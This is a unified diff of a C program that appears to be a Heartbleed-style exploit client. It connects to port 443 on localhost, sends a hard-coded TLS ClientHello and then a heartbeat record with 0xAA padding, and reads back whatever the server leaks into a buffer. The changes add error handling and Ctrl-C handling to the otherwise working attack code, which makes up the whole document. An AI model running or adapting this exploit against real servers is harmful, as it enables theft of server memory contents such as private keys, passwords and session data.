@@ -1,4 +1,4 @@
-/* 
+/*
  *   This program is free software: you can redistribute it and/or modify
  *   it under the terms of the GNU General Public License as published by
  *   the Free Software Foundation, either version 3 of the License, or
@@ -22,7 +22,7 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <netdb.h>
-#include <arpa/inet.h> 
+#include <arpa/inet.h>
 #include <sys/ioctl.h>
 #include <signal.h>
 
@@ -38,22 +38,31 @@
 
 #define SLEEP_SEC 2
 
+
+int sigint = 0;
+
+void sigint_callback(int signum) {
+    sigint = 1;
+}
+
 int connect_to_server(struct sockaddr_in *serv_addr) {
-    int sock = 0;
-    printf("Initializing new connection...\n");
-    sock=socket(AF_INET,SOCK_STREAM,0);
-    
+    int sock = 0, ret;
+
+    sock = socket(AF_INET,SOCK_STREAM,0);
+
+    if(sock == -1) {
+        perror("socket:");
+        return -1;
+    }
+
     serv_addr->sin_family = AF_INET;
     serv_addr->sin_port = htons(443);
     serv_addr->sin_addr.s_addr=inet_addr("127.0.0.1");
-    
-    printf("Connecting...\n");
-    int res = connect(sock, (struct sockaddr *)serv_addr, sizeof(*serv_addr));  
-    if(res < 0){
-        printf("Connection failed\n");
-    } else {
-        printf("Connected!\n");
 
+    ret = connect(sock, (struct sockaddr *)serv_addr, sizeof(*serv_addr));
+    if(ret == -1) {
+        perror("connect:");
+        return -1;
     }
     return sock;
 }
@@ -71,11 +80,11 @@ int main() {
         0x18, SSL_VER, 0x13, 0x83, 0x01, 0x13, 0x70,
     };
     int num = 0;
-    for(num=8; num< HB_LEN; num++) 
+    for(num=8; num< HB_LEN; num++)
         ssl_hb[num] = 0xAA;
 
-    char ssl_hello[HELLO_LEN] = 
-        { 
+    char ssl_hello[HELLO_LEN] =
+        {
         0x16,0x03,0x01,0x01,0x3b,0x01,0x00,0x01,0x37, SSL_VER,0x53,
         0x62,0x5b,0xaf,0x9e,0x24,0x6,0x6a,0x9d,0xb7,0x46,0x49,0x11,
         0xd5,0xa8,0xa5,0x52,0x53,0x95,0x78,0x41,0x7b,0x37,0xb0,0x48,
@@ -102,25 +111,56 @@ int main() {
         0x00,0x00,0x0d,0x00,0x22,0x00,0x20,0x6,0x01,0x6,0x02,0x6,
         0x03,0x05,0x01,0x05,0x02,0x05,0x03,0x04,0x01,0x04,0x02,0x04,
         0x03,0x03,0x01,0x03,0x02,0x03,0x03,0x02,0x01,0x02,0x02,0x02,
-        0x03,0x01,0x01,0x00,0x0f,0x00,0x01,0x01 
+        0x03,0x01,0x01,0x00,0x0f,0x00,0x01,0x01
         };
-    
+
     signal(SIGPIPE, SIG_IGN);
     int n_read, resp_len, bytes_avail;
-    
-    hb_buff = (char *) malloc(HB_BUFF*sizeof(char)); 
+
+    /* Setup SIGINT handler, do not restart recv when interrupted */
+    struct sigaction sigint_action;
+    sigint_action.sa_handler = &sigint_callback;
+    sigint_action.sa_flags = 0; /* No SA_RESTART here */
+    if(sigaction(SIGINT, &sigint_action, NULL) < 0) {
+        perror("sigaction: ");
+        exit(1);
+    }
+
+    hb_buff = (char *) malloc(HB_BUFF*sizeof(char));
+    if(hb_buff == NULL) {
+        fprintf(stderr, "Could not allocate buffer\n");
+        exit(1);
+    }
 
     struct sockaddr_in serv_addr;
+    fprintf(stderr, "Attempting connection to server\n");
     sock = connect_to_server(&serv_addr);
 
-    if(sock < 0) {
-        return 1;
+    if(sock == -1) {
+        fprintf(stderr, "Could not connect to server\n");
+        exit(1);
     }
-    
+
+    fprintf(stderr, "Connection to server successful!\n");
+
     w = write(sock, ssl_hello, HELLO_LEN);
+    if(w == -1) {
+        perror("write :");
+        goto err;
+    } 
+
     n_read = recv(sock, serv_buff, 4096, 0);
-    
+    if(n_read == -1 ) {
+        perror("recv: ");
+        goto err;
+    }
+
     w  = write(sock, ssl_hb, HB_LEN);
+    if(w == -1) {
+        perror("write: ");
+        goto err;
+    }
+
     bytes_avail = 0, n_read =0, resp_len = 0;
 
     do{
@@ -128,7 +168,7 @@ int main() {
          * Requests the number of bytes available to be
          * read from the TCP buffer. If there's nothing
          * to read, waits SLEEP_SEC sec and tries again. If the
-         * receiving buffer is empty this second time, 
+         * receiving buffer is empty this second time,
          * assumes the response from the server is over.
          * Otherwise keeps on reading.
          */
@@ -136,11 +176,22 @@ int main() {
         if(bytes_avail == 0) {
             sleep(SLEEP_SEC);
             ioctl (sock,FIONREAD, &bytes_avail);
-            if(bytes_avail == 0) 
+            if(bytes_avail == 0)
                 break;
         }
         n_read = recv(sock, hb_buff+resp_len, 4096, 0);
+        if(n_read == -1) {
+            perror("recv: ");
+            goto err;
+        }
         resp_len += n_read;
-    }while(1);
+    } while(!sigint);
+
     printf("resplen: %6d\n", resp_len);
-} 
+    return 0;
+
+err:
+    close(sock);
+    exit(1);
+ 
+}
